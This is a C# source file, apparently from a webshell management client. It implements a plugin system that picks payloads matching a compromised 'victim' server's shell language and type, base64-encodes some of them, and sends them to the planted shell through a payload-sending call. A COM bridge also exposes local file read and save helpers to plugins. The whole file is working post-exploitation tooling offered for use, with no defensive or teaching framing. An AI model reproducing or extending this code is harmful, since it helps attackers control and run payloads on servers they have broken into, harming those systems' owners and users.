using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json.Nodes;
using System.Threading.Tasks;

namespace Alien
{
    public class clsfnPlugin
    {
        private clsWeb m_web { get; init; }
        private clsVictim m_victim { get { return m_web.m_victim; } }
        public string m_szPluginsDir { get; init; }
        public string m_szEnvironment { get { return Path.Combine(Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage), m_victim.ShellMethod, Enum.GetName(typeof(enPayloadType), m_victim.ShellPayloadType)).Replace("\\", "/"); } }

        /// <summary>
        /// Remote plugin object
        /// </summary>
        /// <param name="web">Web object</param>
        /// <param name="szDir">Plugins directory</param>
        public clsfnPlugin(clsWeb web, string szDir = "Plugins")
        {
            m_web = web;
            m_szPluginsDir = Path.Combine(Application.StartupPath, szDir);
        }

        public class stManifest
        {
            [JsonProperty("name")]
            public string szPluginName { get; set; }

            [JsonProperty("version")]
            public string szVersion { get; set; }

            [JsonProperty("author")]
            public string szAuthor { get; set; }

            [JsonProperty("environment")]
            public List<string> lsEnvironment { get; set; }

            [JsonProperty("description")]
            public string szDescription { get; set; }
        }

        /// <summary>
        /// Get manifest json object
        /// </summary>
        public stManifest fnLoadPluginManifest(string szPluginDirName)
        {
            try
            {
                string szJsonPath = Path.Combine(szPluginDirName, "manifest.json");
                if (!File.Exists(szJsonPath))
                    throw new FileNotFoundException($"Configuration file not found: " + szJsonPath);

                string szJsonContent = File.ReadAllText(szJsonPath);
                stManifest manifest = JsonConvert.DeserializeObject<stManifest>(szJsonContent);

                return manifest;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        /// <summary>
        /// Get all plugins
        /// </summary>
        public List<stManifest> fnGetPlugins()
        {
            List<stManifest> plugins = new List<stManifest>();

            string szEnv = Path.Combine(Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage), m_victim.ShellMethod, Enum.GetName(typeof(enPayloadType), m_victim.ShellPayloadType)).Replace("\\", "/");

            foreach (string szDir in Directory.GetDirectories(m_szPluginsDir))
            {
                stManifest manifest = fnLoadPluginManifest(Path.GetFileName(szDir));
                if (manifest == null || manifest.lsEnvironment == null)
                    continue;

                if (!manifest.lsEnvironment.Contains(szEnv))
                    continue;

                plugins.Add(manifest);
            }

            return plugins;
        }

        [ComVisible(true)]
        public class clsBridge
        {
            private clsWeb m_web { get; init; }
            private string m_szEnvironment { get; set; }

            public clsBridge(clsWeb web, string szEnvironment)
            {
                m_web = web;
                m_szEnvironment = szEnvironment;
            }

            public string fnGetShellType()
            {
                return m_szEnvironment;
            }

            public bool fnbIsUnixLike()
            {
                return m_web.m_victim.m_bUnixLike;
            }

            public string fnAvailableEnvironment(string szPath)
            {
                string szJsonPath = Path.Combine(szPath, "manifest.json");
                if (!File.Exists(szJsonPath))
                    return "[]";

                string szJson = File.ReadAllText(szJsonPath);
                var manifest = JsonConvert.DeserializeObject<stManifest>(szJson);

                var envList = manifest?.lsEnvironment ?? new List<string>();

                return JsonConvert.SerializeObject(envList);
            }

            public string fnGetPayload(string szDirName, string szEnv, string szName)
            {
                string szExtension = string.Empty;
                if (szEnv.Contains("NebulaPulsar"))
                {
                    if (szEnv.Contains("JSP"))
                        szExtension = "class";
                    else if (szEnv.Contains("ASPX") || szEnv.Contains("ASHX") || szEnv.Contains("ASMX"))
                        szExtension = "dll";
                }
                else
                {
                    szExtension = clsWeb.m_dicPayloadExtension[m_web.m_victim.ShellLanguage];
                }

                string szPayloadPath = Path.Combine(szDirName, "payloads", szEnv, $"{szName}.{szExtension}").Replace("/", "\\");
                if (!File.Exists(szPayloadPath))
                    return string.Empty;

                string szPayload = string.Empty;
                if (szPayloadPath.Contains("NebulaPulsar"))
                {
                    szPayload = Convert.ToBase64String(File.ReadAllBytes(szPayloadPath));
                }
                else
                {
                    szPayload = File.ReadAllText(szPayloadPath);

                    foreach (string s in clsWeb.m_dicRemoveSyntax[m_web.m_victim.ShellLanguage])
                        szPayload = szPayload.Replace(s, string.Empty);
                }

                return szPayload;
            }

            public string fnReadFileText(string szFilePath)
            {
                if (!File.Exists(szFilePath))
                    return string.Empty;

                return File.ReadAllText(szFilePath);
            }

            public string fnReadFileBytes(string szFilePath)
            {
                if (!File.Exists(szFilePath))
                    return string.Empty;

                return Convert.ToBase64String(File.ReadAllBytes(szFilePath));
            }

            public string fnSaveFileText(string szFileName, string szFileContent)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.FileName = szFileName;
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        File.WriteAllText(sfd.FileName, szFileContent);
                        return "[+] Saved file successfully: " + sfd.FileName;
                    }
                    catch (Exception ex)
                    {
                        return "[-] " + ex.Message;
                    }
                }
                else
                {
                    return "[!] Action was cancelled.";
                }
            }

            public string fnSaveFileBytes(string szFileName, string szB64Data)
            {
                SaveFileDialog sfd = new SaveFileDialog();
                sfd.FileName = szFileName;
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        byte[] abFileBytes = Convert.FromBase64String(szB64Data);
                        File.WriteAllBytes(sfd.FileName, abFileBytes);
                        return "[+] Saved file successfully: " + sfd.FileName;
                    }
                    catch (Exception ex)
                    {
                        return "[-] " + ex.Message;
                    }
                }
                else
                {
                    return "[!] Action was cancelled.";
                }
            }

            public string fnSaveTextFiles(Dictionary<string, string> dicFile)
            {
                FolderBrowserDialog fbd = new FolderBrowserDialog();
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        foreach (var szFilename in dicFile.Keys)
                        {
                            string szContent = dicFile[szFilename];
                            File.WriteAllText(szFilename, szContent);
                        }
                        return "[+] Action successfully: " + fbd.SelectedPath;
                    }
                    catch (Exception ex)
                    {
                        return "[-] " + ex.Message;
                    }
                }
                else
                {
                    return "[!] Action was aborted.";
                }
            }

            public string fnSaveByteFiles(Dictionary<string, byte[]> dicFile)
            {
                FolderBrowserDialog fbd = new FolderBrowserDialog();
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        foreach (var szFilename in dicFile.Keys)
                        {
                            byte[] abContent = dicFile[szFilename];
                            File.WriteAllBytes(szFilename, abContent);
                        }
                        return "[+] Action successfully: " + fbd.SelectedPath;
                    }
                    catch (Exception ex)
                    {
                        return "[-] " + ex.Message;
                    }
                }
                else
                {
                    return "[!] Action was aborted.";
                }
            }

            public byte[] fnFileUpload()
            {
                OpenFileDialog ofd = new OpenFileDialog();
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    try
                    {
                        return File.ReadAllBytes(ofd.FileName);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                return new byte[] { };
            }

            public async Task<string> fnRun(string szJson, string szPayload, string szEnvironment)
            {
                string szResp = await m_web.fnszSendPayload("plugin", new string[] { szPayload, szJson });
                return szResp;
            }
        }
    }
}
